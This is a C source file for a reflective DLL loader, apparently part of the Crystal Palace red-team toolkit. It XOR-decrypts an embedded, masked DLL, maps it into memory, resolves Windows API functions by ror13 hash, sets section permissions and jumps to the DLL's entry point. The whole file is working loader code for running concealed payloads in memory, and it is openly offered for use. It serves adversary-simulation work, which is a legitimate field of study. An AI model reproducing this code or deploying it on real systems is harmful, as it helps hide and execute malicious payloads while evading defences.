/*
 * Copyright 2025 Raphael Mudge, Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "tcg.h"

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI BOOL   WINAPI KERNEL32$VirtualFree (LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
WINBASEAPI BOOL   WINAPI KERNEL32$VirtualProtect (LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);

/*
 * This is our opt-in Dynamic Function Resolution resolver. It turns MODULE$Function into pointers.
 * See dfr "resolve" "ror13" in loader.spec
 */
FARPROC resolve(DWORD modHash, DWORD funcHash) {
	HANDLE hModule = findModuleByHash(modHash);
	return findFunctionByHash(hModule, funcHash);
}

/*
 * This is our opt-in function to help fix ptrs in x86 PIC. See fixptrs _caller" in loader.spec
 */
#ifdef WIN_X86
__declspec(noinline) ULONG_PTR caller( VOID ) { return (ULONG_PTR)WIN_GET_CALLER(); }
#endif

/*
 * This is the Crystal Palace convention for getting ahold of data linked with this loader.
 */
char _DLL_   [0] __attribute__ ( ( section ( "dll"   ) ) );  
char _MASK_  [0] __attribute__ ( ( section ( "mask"  ) ) ); 

#define GETRESOURCE(x) ( char * ) &x

typedef struct {
    int  len;
    char value[];
} RESOURCE;


void fix_section_permissions(DLLDATA * dll, char * dst) {
	DWORD section_count = dll->NtHeaders->FileHeader.NumberOfSections;
	IMAGE_SECTION_HEADER * section_hdr = (IMAGE_SECTION_HEADER *) PTR_OFFSET(dll->OptionalHeader, dll->NtHeaders->FileHeader.SizeOfOptionalHeader);

	for (int i = 0; i < section_count; i++) {
		void  * section_dst  = dst + section_hdr->VirtualAddress;
		DWORD   section_size = section_hdr->SizeOfRawData;
		DWORD   new_protect  = 0;
		DWORD   old_protect  = 0;

		if (section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE)
			new_protect = PAGE_WRITECOPY;
		if (section_hdr->Characteristics & IMAGE_SCN_MEM_READ)
			new_protect = PAGE_READONLY;
		if ((section_hdr->Characteristics & IMAGE_SCN_MEM_READ) && (section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE))
			new_protect = PAGE_READWRITE;
		if (section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE)
			new_protect = PAGE_EXECUTE;
		if ((section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE))
			new_protect = PAGE_EXECUTE_WRITECOPY;
		if ((section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (section_hdr->Characteristics & IMAGE_SCN_MEM_READ))
			new_protect = PAGE_EXECUTE_READ;
		if ((section_hdr->Characteristics & IMAGE_SCN_MEM_READ) && (section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE) && (section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE))
			new_protect = PAGE_EXECUTE_READWRITE;

		KERNEL32$VirtualProtect(section_dst, section_size, new_protect, &old_protect);
		section_hdr++;
	}
}

/*
 * Our reflective loader itself, have fun, go nuts!
 */
void go() {
	DLLDATA      data;
	IMPORTFUNCS  funcs;

	RESOURCE* masked_dll = (RESOURCE*) GETRESOURCE ( _DLL_ );
	RESOURCE* mask_key   = (RESOURCE*) GETRESOURCE ( _MASK_ );

	char* dll_src = KERNEL32$VirtualAlloc ( NULL, masked_dll->len, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );

	for ( int i = 0; i < masked_dll->len; i++ ) {
		dll_src [ i ] = masked_dll->value [ i ] ^ mask_key->value [ i % mask_key->len ];
	}

	/* parse our DLL */
	ParseDLL(dll_src, &data);

	/* allocate memory */
	char* dll_dst = KERNEL32$VirtualAlloc ( NULL, SizeOfDLL ( &data ), MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );

	/* load the DLL */
	LoadDLL(&data, dll_src, dll_dst);

	/* setup our IMPORTFUNCS data structure */
	funcs.GetProcAddress = GetProcAddress;
	funcs.LoadLibraryA   = LoadLibraryA;

	/* process the imports */
	ProcessImports(&funcs, &data, dll_dst);

	/* fix section permissions */
	fix_section_permissions(&data, dll_dst);

	DLLMAIN_FUNC entry_point = EntryPoint(&data, dll_dst);

	/* free the decrypted DLL copy */
	KERNEL32$VirtualFree(dll_src, 0, MEM_RELEASE);

	/* pass execution to our DLL */
	entry_point((HINSTANCE)dll_dst, DLL_PROCESS_ATTACH, NULL);
}
